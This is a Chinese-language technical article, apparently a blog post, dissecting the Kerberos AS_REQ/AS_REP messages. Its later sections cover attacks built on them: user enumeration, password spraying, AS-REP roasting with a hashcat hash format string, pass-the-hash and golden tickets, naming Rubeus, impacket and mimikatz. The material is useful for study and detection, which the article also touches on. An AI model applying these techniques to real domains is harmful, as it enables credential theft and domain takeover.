<p>熟悉内网渗透的应该都对IPC，黄金票据，白银票据，ntlm relay，Ptt,Ptk 这些词汇再熟悉不够了，对其利用工具也了如指掌，但是有些人对里面使用的原理还不太了解，知其然不知其所以然，本系列文章将针对内网渗透的常见协议(如kerbeos,ntlm,smb,ldap等)进行协议分析，相关漏洞分析以及漏洞工具分析利用。</p>
<p>kerberos 篇将从四个方面来阐述kerberos协议，分别是kerberos的两个基础认证模块AS_REQ &amp; AS_REP,TGS_REQ &amp; TGS_REP。以及微软扩展的两个认证模块S4U和PAC。这篇文章是 kerberos 篇的第一篇文章 <code>AS_REQ</code> &amp; <code>AS_REP</code> 。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01176eab7c7a39d1d9.png"></p>
<h3 id="kerberos-协议概述"><a href="#kerberos-协议概述" class="headerlink" title="kerberos 协议概述"></a>kerberos 协议概述</h3><p>Kerberos是一种由MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端 &#x2F; 服务器应用程序提供强身份验证。</p>
<p>在Kerberos协议中主要是有三个角色的存在：</p>
<ol>
<li>访问服务的<code>Client</code>(以下表述为Client 或者用户)</li>
<li>提供服务的<code>Server</code>(以下表述为服务)</li>
<li><code>KDC</code>（Key Distribution Center）密钥分发中心 kerberos 测试工具介绍</li>
</ol>
<p>其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p>
<p>kerberos的简化认证认证过程如下图</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownkerberos_environment.webp"></p>
<ol>
<li><code>AS_REQ</code>: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳</li>
<li><code>AS_REP</code>: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。</li>
<li><code>TGS_REQ</code>: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求</li>
<li><code>TGS_REP</code>: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)</li>
<li><code>AP_REQ</code>: Client拿着TGS票据去请求服务</li>
<li><code>AP_REP</code>: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。</li>
</ol>
<h3 id="kerberos-测试工具"><a href="#kerberos-测试工具" class="headerlink" title="kerberos 测试工具"></a>kerberos 测试工具</h3><p>在学习 kerberos 协议的过程中，一直以来都是利用工具发包，然后再通过 wireshark 抓包分析，这让用惯了Burp的我很不习惯，burp的repeater模块可以很方便的改包，发包，查看响应包。为了更方便得学习kerberos，简单得写了个测试工具，用于 kerbreos 协议的研究，实验环境为虚拟机内的win7系统中。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015f25c3d61e10068e.png"></p>
<p>点击修改配置，支持明文密码以及hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ee3217094e548c8c.png"></p>
<p>协议的各个字段将在本篇文章以及接下来的几篇文章里面详细阐述，配合此工具理解kerberos 字段，效果更佳。</p>
<h3 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h3><p>用户向KDC发起AS_REQ,请求凭据是用户 hash加密的时间戳。请求凭据放在PA_DATA里面。详情见以下每个字段的详细介绍。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010aad636f2c02d394.png"></p>
<h4 id="pvno"><a href="#pvno" class="headerlink" title="pvno"></a>pvno</h4><p>kerberos 版本号</p>
<h4 id="msg-type"><a href="#msg-type" class="headerlink" title="msg-type"></a>msg-type</h4><p>类型，AS_REQ对应的就是KRB_AS_REQ(0x0a)</p>
<h4 id="PA-DATA"><a href="#PA-DATA" class="headerlink" title="PA_DATA"></a>PA_DATA</h4><p>主要是一些认证信息。一个列表，包含若干个认证消息用于认证，我们也可以Authenticator。每个认证消息有type和value。</p>
<p>type主要有以下一些：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">            NONE = <span class="number">0</span>,</span><br><span class="line">​            TGS_REQ = <span class="number">1</span>,</span><br><span class="line">​            AP_REQ = <span class="number">1</span>,</span><br><span class="line">​            ENC_TIMESTAMP = <span class="number">2</span>,</span><br><span class="line">​            PW_SALT = <span class="number">3</span>,</span><br><span class="line">​            ENC_UNIX_TIME = <span class="number">5</span>,</span><br><span class="line">​            SANDIA_SECUREID = <span class="number">6</span>,</span><br><span class="line">​            SESAME = <span class="number">7</span>,</span><br><span class="line">​            OSF_DCE = <span class="number">8</span>,</span><br><span class="line">​            CYBERSAFE_SECUREID = <span class="number">9</span>,</span><br><span class="line">​            AFS3_SALT = <span class="number">10</span>,</span><br><span class="line">​            ETYPE_INFO = <span class="number">11</span>,</span><br><span class="line">​            SAM_CHALLENGE = <span class="number">12</span>,</span><br><span class="line">​            SAM_RESPONSE = <span class="number">13</span>,</span><br><span class="line">​            PK_AS_REQ_19 = <span class="number">14</span>,</span><br><span class="line">​            PK_AS_REP_19 = <span class="number">15</span>,</span><br><span class="line">​            PK_AS_REQ_WIN = <span class="number">15</span>,</span><br><span class="line">​            PK_AS_REQ = <span class="number">16</span>,</span><br><span class="line">​            PK_AS_REP = <span class="number">17</span>,</span><br><span class="line">​            PA_PK_OCSP_RESPONSE = <span class="number">18</span>,</span><br><span class="line">​            ETYPE_INFO2 = <span class="number">19</span>,</span><br><span class="line">​            USE_SPECIFIED_KVNO = <span class="number">20</span>,</span><br><span class="line">​            SVR_REFERRAL_INFO = <span class="number">20</span>,</span><br><span class="line">​            SAM_REDIRECT = <span class="number">21</span>,</span><br><span class="line">​            GET_FROM_TYPED_DATA = <span class="number">22</span>,</span><br><span class="line">​            SAM_ETYPE_INFO = <span class="number">23</span>,</span><br><span class="line">​            SERVER_REFERRAL = <span class="number">25</span>,</span><br><span class="line">​            TD_KRB_PRINCIPAL = <span class="number">102</span>,</span><br><span class="line">​            PK_TD_TRUSTED_CERTIFIERS = <span class="number">104</span>,</span><br><span class="line">​            PK_TD_CERTIFICATE_INDEX = <span class="number">105</span>,</span><br><span class="line">​            TD_APP_DEFINED_ERROR = <span class="number">106</span>,</span><br><span class="line">​            TD_REQ_NONCE = <span class="number">107</span>,</span><br><span class="line">​            TD_REQ_SEQ = <span class="number">108</span>,</span><br><span class="line">​            PA_PAC_REQUEST = <span class="number">128</span>,</span><br><span class="line">​            S4U2SELF = <span class="number">129</span>,</span><br><span class="line">​            PA_PAC_OPTIONS = <span class="number">167</span>,</span><br><span class="line">​            PK_AS_09_BINDING = <span class="number">132</span>,</span><br><span class="line">​            CLIENT_CANONICALIZED = <span class="number">133</span></span><br></pre></td></tr></table></figure>

<p>在AS_REQ阶段主要用到的有两个</p>
<ol>
<li><p><code>ENC_TIMESTAMP</code><br>这个是预认证，就是用用户hash加密时间戳，作为value 发送给AS服务器。然后AS服务器那边有用户hash，使用用户hash进行解密，获得时间戳，如果能解密，且时间戳在一定的范围内，则证明认证通过</p>
</li>
<li><p><code>PA_PAC_REQUEST</code><br>这个是启用PAC支持的扩展。PAC（Privilege Attribute Certificate）并不在原生的 kerberos 里面，是微软引进的扩展。详细的内容之后会详细介绍PAC。PAC包含在AS_REQ的响应 body(AS_REP) 。这里的 value 对应的是 include&#x3D;true 或者 include&#x3D;false (KDC根据include的值来判断返回的票据中是否携带PAC)。</p>
</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019ac8c55225707d89.png"></p>
<h4 id="REQ-BODY"><a href="#REQ-BODY" class="headerlink" title="REQ_BODY"></a>REQ_BODY</h4><p>kdc-options 一些flag 字段</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">            VALIDATE = <span class="number">0x00000001</span>,</span><br><span class="line">​              RENEW = <span class="number">0x00000002</span>,</span><br><span class="line">​              UNUSED29 = <span class="number">0x00000004</span>,</span><br><span class="line">​              ENCTKTINSKEY = <span class="number">0x00000008</span>,</span><br><span class="line">​              RENEWABLEOK = <span class="number">0x00000010</span>,</span><br><span class="line">​              DISABLETRANSITEDCHECK = <span class="number">0x00000020</span>,</span><br><span class="line">​              UNUSED16 = <span class="number">0x0000FFC0</span>,</span><br><span class="line">​              CANONICALIZE = <span class="number">0x00010000</span>,</span><br><span class="line">​              CNAMEINADDLTKT = <span class="number">0x00020000</span>,</span><br><span class="line">​              OK_AS_DELEGATE = <span class="number">0x00040000</span>,</span><br><span class="line">​              UNUSED12 = <span class="number">0x00080000</span>,</span><br><span class="line">​              OPTHARDWAREAUTH = <span class="number">0x00100000</span>,</span><br><span class="line">​              PREAUTHENT = <span class="number">0x00200000</span>,</span><br><span class="line">​              INITIAL = <span class="number">0x00400000</span>,</span><br><span class="line">​              RENEWABLE = <span class="number">0x00800000</span>,</span><br><span class="line">​              UNUSED7 = <span class="number">0x01000000</span>,</span><br><span class="line">​              POSTDATED = <span class="number">0x02000000</span>,</span><br><span class="line">​              ALLOWPOSTDATE = <span class="number">0x04000000</span>,</span><br><span class="line">​              PROXY = <span class="number">0x08000000</span>,</span><br><span class="line">​              PROXIABLE = <span class="number">0x10000000</span>,</span><br><span class="line">​              FORWARDED = <span class="number">0x20000000</span>,</span><br><span class="line">​              FORWARDABLE = <span class="number">0x40000000</span>,</span><br><span class="line">​              RESERVED = <span class="number">0x80000000</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>cname<br>PrincipalName 类型。PrincipalName包含type和value。</p>
<ul>
<li>KRB_NT_PRINCIPAL &#x3D; 1 means just the name of the principal 如dailker</li>
<li>KRB_NT_SRV_INST &#x3D; 2 service and other unique instance (krbtgt) 如krbtgt，cifs</li>
<li>KRB_NT_ENTERPRISE_PRINCIPAL &#x3D; 10 如 <a href="mailto:&#x75;&#x73;&#x65;&#114;&#x40;&#x64;&#x6f;&#x6d;&#97;&#x69;&#x6e;&#x2e;&#99;&#111;&#x6d;">&#x75;&#x73;&#x65;&#114;&#x40;&#x64;&#x6f;&#x6d;&#97;&#x69;&#x6e;&#x2e;&#99;&#111;&#x6d;</a><br>在AS_REQ里面cname 是请求的用户,这个用户名存在和不存在，返回的包有差异，可以用于枚举域内用户名。详情见<a href='#p1'>相关的安全问题&gt;用户名枚举</a></li>
</ul>
</li>
<li><p>sname<br>PrincipalName 类型<br>在AS_REQ里面sname是krbtgt，类型是KRB_NT_SRV_INST</p>
</li>
<li><p>realm<br>域名</p>
</li>
<li><p>from<br>发送时间</p>
</li>
<li><p>till<br>到期时间，rubeus和kekeo都是20370913024805Z，这个可以作为特征来检测工具。</p>
</li>
<li><p>nonce<br>随机生成的一个数kekeo&#x2F;mimikatz nonce是12381973，rubeus nonce是1818848256，这个也可以用来作为特征检测工具。</p>
</li>
<li><p>etype<br>加密类型，有</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">             des_cbc_crc = <span class="number">1</span>,</span><br><span class="line">​             des_cbc_md4 = <span class="number">2</span>,</span><br><span class="line">​             des_cbc_md5 = <span class="number">3</span>,</span><br><span class="line">​             des3_cbc_md5 = <span class="number">5</span>,</span><br><span class="line">​             des3_cbc_sha1 = <span class="number">7</span>,</span><br><span class="line">​             dsaWithSHA1_CmsOID = <span class="number">9</span>,</span><br><span class="line">​             md5WithRSAEncryption_CmsOID = <span class="number">10</span>,</span><br><span class="line">​             sha1WithRSAEncryption_CmsOID = <span class="number">11</span>,</span><br><span class="line">​             rc2CBC_EnvOID = <span class="number">12</span>,</span><br><span class="line">​             rsaEncryption_EnvOID = <span class="number">13</span>,</span><br><span class="line">​             rsaES_OAEP_ENV_OID = <span class="number">14</span>,</span><br><span class="line">​             des_ede3_cbc_Env_OID = <span class="number">15</span>,</span><br><span class="line">​             des3_cbc_sha1_kd = <span class="number">16</span>,</span><br><span class="line">​             aes128_cts_hmac_sha1 = <span class="number">17</span>,</span><br><span class="line">​             aes256_cts_hmac_sha1 = <span class="number">18</span>,</span><br><span class="line">​             rc4_hmac = <span class="number">23</span>,</span><br><span class="line">​             rc4_hmac_exp = <span class="number">24</span>,</span><br><span class="line">​             subkey_keymaterial = <span class="number">65</span></span><br></pre></td></tr></table></figure>

<p>这个地方要注意的是如果在配置里面选择用hash(不是plaintext)的话，hash的加密类型，要跟etype一样。因为KDC是按照etype类型选择用户对应加密方式的hash，如果是选择明文(plaintext)，那么client 会按照etype里面的加密方式将明文加密成hash。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01161830d0444fbe4c.png"></p>
<h3 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS_REP"></a>AS_REP</h3><p>KDC使用用户 hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含用户的sid，用户所在的组。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015d346eac5679f85c.png"></p>
<p>KDC使用用户 hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含用户的sid，用户所在的组。</p>
<h4 id="msg-type-1"><a href="#msg-type-1" class="headerlink" title="msg-type"></a>msg-type</h4><p>AS_REQ的响应body对应的就是KRB_AS_REP(0x0b)</p>
<h4 id="crealm"><a href="#crealm" class="headerlink" title="crealm"></a>crealm</h4><p>域名</p>
<h4 id="cname"><a href="#cname" class="headerlink" title="cname"></a>cname</h4><p>用户名</p>
<h4 id="ticket"><a href="#ticket" class="headerlink" title="ticket"></a>ticket</h4><p>这个ticket用于TGS_REQ的认证。是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，因此如果我们拥有krbtgt的hash就可以自己制作一个ticket，既黄金票据。详情见<a href='#p2'>相关的安全问题&gt;黄金票据</a>。</p>
<h4 id="enc-part"><a href="#enc-part" class="headerlink" title="enc_part"></a>enc_part</h4><p>这部分是可以解密的，key是用户hash，解密后得到Encryptionkey，Encryptionkey里面最重要的字段是session key，作为下阶段的认证密钥。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016a35794986fb33b0.png"></p>
<h3 id="导出的票据"><a href="#导出的票据" class="headerlink" title="导出的票据"></a>导出的票据</h3><p>凭据里面最核心的东西是 session-key 和加密的 ticket 。</p>
<p>正常我们用工具生成的凭据是.ccache和.kirbi后缀的，用 mimikatz，kekeo，rubeus 生成的凭据是以.kirbi后缀的。impacket 生成的凭据的后缀是.ccache。两种票据主要包含的都是 session-key 和加密的 ticket ，因此可以相互转化。</p>
<p>以kirbi为例介绍下该结构体。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> KRB-CRED::= [APPLICATION <span class="number">22</span>] SEQUENCE &#123;</span><br><span class="line">   pvno[<span class="number">0</span>] INTEGER(<span class="number">5</span>),</span><br><span class="line">   msg-type[<span class="number">1</span>] INTEGER(<span class="number">22</span>),</span><br><span class="line">   tickets[<span class="number">2</span>] SEQUENCE OF Ticket,</span><br><span class="line">   enc-part[<span class="number">3</span>] EncryptedData -- EncKrbCredPart</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中ticket来自于KRB_AS_REP部分的ticket</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">EncKrbCredPart  ::= [APPLICATION <span class="number">29</span>] SEQUENCE &#123;</span><br><span class="line">   ticket-info     [<span class="number">0</span>] SEQUENCE OF KrbCredInfo,  <span class="comment">//这里就只用到这个</span></span><br><span class="line">   nonce           [<span class="number">1</span>] UInt32 OPTIONAL,</span><br><span class="line">   timestamp       [<span class="number">2</span>] KerberosTime OPTIONAL,</span><br><span class="line">   usec            [<span class="number">3</span>] Microseconds OPTIONAL,</span><br><span class="line">   s-address       [<span class="number">4</span>] HostAddress OPTIONAL,</span><br><span class="line">   r-address       [<span class="number">5</span>] HostAddress OPTIONAL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ticket-info部分的主要内容是session-key，来自于用户hash解密enc_part的部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">KrbCredInfo     ::= SEQUENCE &#123;</span><br><span class="line">  key             [<span class="number">0</span>] EncryptionKey,      sessionKey</span><br><span class="line">  prealm          [<span class="number">1</span>] Realm OPTIONAL,  <span class="comment">//对应的是realm</span></span><br><span class="line">  pname           [<span class="number">2</span>] PrincipalName OPTIONAL, <span class="comment">// 对应的是cname</span></span><br><span class="line">  flags           [<span class="number">3</span>] TicketFlags OPTIONAL, </span><br><span class="line">  authtime        [<span class="number">4</span>] KerberosTime OPTIONAL, <span class="comment">//not require</span></span><br><span class="line">  starttime       [<span class="number">5</span>] KerberosTime OPTIONAL, <span class="comment">// </span></span><br><span class="line">  endtime         [<span class="number">6</span>] KerberosTime OPTIONAL,</span><br><span class="line">  renew-till      [<span class="number">7</span>] KerberosTime OPTIONAL,</span><br><span class="line">  srealm          [<span class="number">8</span>] Realm OPTIONAL, <span class="comment">//对应的是realm</span></span><br><span class="line">  sname           [<span class="number">9</span>] PrincipalName OPTIONAL, <span class="comment">// 对应的是sname</span></span><br><span class="line">  caddr           [<span class="number">10</span>] HostAddresses OPTIONAL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="相关的安全问题"><a href="#相关的安全问题" class="headerlink" title="相关的安全问题"></a>相关的安全问题</h3><h4 id="pass-the-hash-和-pass-the-key"><a href="#pass-the-hash-和-pass-the-key" class="headerlink" title="pass the hash 和 pass the key"></a>pass the hash 和 pass the key</h4><p>在连接配置的时候允许使用hash进行认证，而不是只有账号密码才能认证。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01af29156e1e95022b.png"></p>
<p>就是由于在进行认证的时候，是用用户hash加密时间戳，即使在使用密码进行登录的情况下，也是先把密码加密成hash，再进行认证。因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。不管是rubeus还是impacket里面的相关脚本都是支持直接使用hash进行认证。其中，如果hash的ntlm hash，然后加密方式是rc4，这种就算做是pass the hash，如果是hash是aes key(使用sekurlsa::ekeys导出来)，就算是pass the key。在很多地方，不支持rc4加密方式的时候，使用pass the key不失为一种好方法。</p>
<h4 id='p1'>用户名枚举</h4>
看以下几种情况

<p>用户名存在，密码错误的情况下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014c57716ba42b44cd.png"></p>
<p>用户名不存在的情况下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c7363c4bf243acc6.png"></p>
<p>通过这个比较就可以写脚本改变 cname 的值进行用户名枚举。在域内没有域账号的情况下进行用户名枚举，在有账号的情况的下通过 LDAP 查询就行。如果有域内机器的 system 权限，那那台机器也是个域账户，账户名是机器名$.</p>
<h4 id="Password-Spraying"><a href="#Password-Spraying" class="headerlink" title="Password Spraying"></a>Password Spraying</h4><p>在已有用户名的时候，可以尝试爆破密码。<br>密码正确的情况下:</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0110bca08bfd34bb90.png"></p>
<p>密码错误的情况下:</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e34aa2625bcdaa3a.png"></p>
<p>这个时候就可以进行密码爆破了，但是在实践中，许多渗透测试人员和攻击者通常都会使用一种被称为“密码喷洒（Password Spraying）”的技术来进行测试和攻击。对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。普通的爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名。</p>
<h4 id="AS-REPRoasting"><a href="#AS-REPRoasting" class="headerlink" title="AS-REPRoasting"></a>AS-REPRoasting</h4><p>对于域用户，如果设置了选项 <code>Do not require Kerberos preauthentication</code>，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户hash加密session-key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成<code>Kerberos 5 AS-REP etype 23</code>(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014ca76343bf5ba087.png"></p>
<p>我们没有用户hash，PA-DATA选择PA_PAC_REQUEST就行</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e43059e3547c0770.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01618262dcc542af40.png"></p>
<p>点击鼠标右键获取AS_REP里面enc-part部分里面的ciper，然后组装成前面32位16进制字符+$+后面的16进制字符得到repHash,然后<code>format(&quot;$krb5asrep$23$&#123;0&#125;@&#123;1&#125;:&#123;2&#125;&quot;, userName, domain, repHash)</code>得到字符串，交给hashcat 破解就行</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014bb1a809f8f463e8.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0175eb56f168c260d3.png"></p>
<p>这里面只做漏洞原理演示。</p>
<h4 id='p2'>黄金票据</h4>

<p>在AS_REP里面的ticket的encpart是使用krbtgt的hash进行加密的，如果我们拥有krbtgt的hash，就可以给我们自己签发任意用户的TGT票据，这个票据也被称为黄金票据。</p>
<h3 id="部分相关的工具"><a href="#部分相关的工具" class="headerlink" title="部分相关的工具"></a>部分相关的工具</h3><h4 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h4><p>Rubeus跟AS_REQ有关的功能主要有两个。</p>
<ul>
<li>asktgt</li>
</ul>
<p>这个功能用于发送tgt请求包，并将凭据以base64打印出来。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f304484b8f118bcf.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010c490cf19cc4d632.png"></p>
<p>可以通过powershell 解密base64并写入文件(注意回车换行)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b376d2fbbc9bcb60.png"></p>
<ul>
<li>As-repoasting</li>
</ul>
<p>这个功能会通过LDAP查询域内用户设置了选项”Do not require Kerberos preauthentication”，然后发AS_REQ的包，直接生成hash或者john可破解的格式</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01281791daf1a7a7b0.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d64b24a81966e52a.png"></p>
<h4 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h4><p>Impact 里面跟AS_REQ相关的脚本主要有两个。</p>
<ul>
<li>getTGT</li>
</ul>
<p>给定密码，哈希或aesKey，此脚本将请求TGT并将其保存为ccache。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0179e377e91abeb5d3.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f6d5b5f04caafa0f.png"></p>
<p>这里面需要注意的是用mimikatz，kekeo，rubeus生成的凭据是以<code>.kirbi</code>后缀的。impacket 生成的凭据的后缀是<code>.ccache</code>。</p>
<p>可以通过<a target="_blank" rel="noopener" href="https://github.com/rvazarkar/KrbCredExport.git">工具</a>里面的脚本转化为kirbi</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019d7954d5dd545bb1.png"></p>
<ul>
<li>GetNPUsers</li>
</ul>
<p>此示例将尝试为那些设置了属性“不需要Kerberos预身份验证”（UF_DONT_REQUIRE_PREAUTH）的用户列出并获取TGT。输出与JtR兼容。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d8b0c1457d2a779d.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017d2483b993b81c82.png"></p>
<ul>
<li>ticketer</li>
</ul>
<p>该脚本将从零开始或基于模板（从KDC合法请求）创建Golden &#x2F; Silver票据，允许您自定义PAC_LOGON_INFO结构中设置的一些参数，特别是组，ExtraSids，持续时间等，票据格式是ccache.</p>
<p>首先获取krbtgt的hash:</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01697b8e91c05bcddf.png"></p>
<p>获取域的sid</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b95246c0159fce6e.png"></p>
<p>制作黄金票据</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e3d6ff82445cf443.png"></p>
<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><ul>
<li>kerberos::golden</li>
</ul>
<p>mimikatz的kerberos::golden模块可以用于制作黄金票据,票据格式是.kirbi<br>首先获取krbtgt的hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0103e479df6f95c9ab.png"></p>
<p>获取域的sid</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017ed9b1c7d455c5d2.png"></p>
<p>制作黄金票据</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ae3c1d04ccc46dfc.png"></p>
<h4 id="nmap-NSE脚本"><a href="#nmap-NSE脚本" class="headerlink" title="nmap NSE脚本"></a>nmap NSE脚本</h4><p>krb5-enum-users<br>nmap 里面的这个脚本可以用来枚举域内用户</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0111d61a08ff02f41d.png"></p>
<h4 id="DomainPasswordSpray"><a href="#DomainPasswordSpray" class="headerlink" title="DomainPasswordSpray"></a>DomainPasswordSpray</h4><p>DomainPasswordSpray是用PowerShell编写的工具，用于对域用户执行密码喷洒攻击。默认情况下，它将利用LDAP从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018884748fa98a8512.png"></p>
<h2 id="TGS-REQ-amp-TGS-REP"><a href="#TGS-REQ-amp-TGS-REP" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>这篇文章是主讲TGS_REQ&amp; TGS_REP。在TGS_REQ &amp; TGS_REP阶段，用户通过AS_REP拿到的TGT票据，去向KDC申请特定服务的访问权限，KDC校验TGT票据，如果校验通过的话，会向用户发送一个TGS票据，之后用户再拿着TGS去访问特定的服务。这一阶段，微软引进了两个扩展S4U2SELF和S4U2PROXY。考虑到这两个扩展是TGS的子协议，把S4U归纳到这篇文章里面一起讲。</p>
